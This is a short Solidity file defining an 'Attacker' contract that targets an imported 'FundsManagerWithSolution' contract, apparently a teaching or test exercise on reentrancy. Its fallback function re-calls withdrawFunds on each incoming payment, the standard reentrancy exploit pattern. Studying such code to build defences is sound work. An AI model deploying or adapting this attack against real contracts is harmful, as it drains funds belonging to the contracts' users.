// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./FundsManagerWithSolution.sol";

contract Attacker {

    FundsManagerWithSolution public target;
    mapping(address => uint) private attackerBalance;
    
    constructor(address victimAddress) payable {
        target = FundsManagerWithSolution(victimAddress);
        target.addUser(address(this));
        attackerBalance[address(this)] += msg.value;
    }
    
    function deposit(uint _value) public payable {
        target.depositFunds{value:_value}();
    }
    
    function withdraw(uint _value) public payable {
        target.withdrawFunds(_value);
    }
    
    function getAttackerBalance() public view returns(uint){
        return address(this).balance;
    }
    
    fallback() external payable {
        target.withdrawFunds(1);
    }    
}
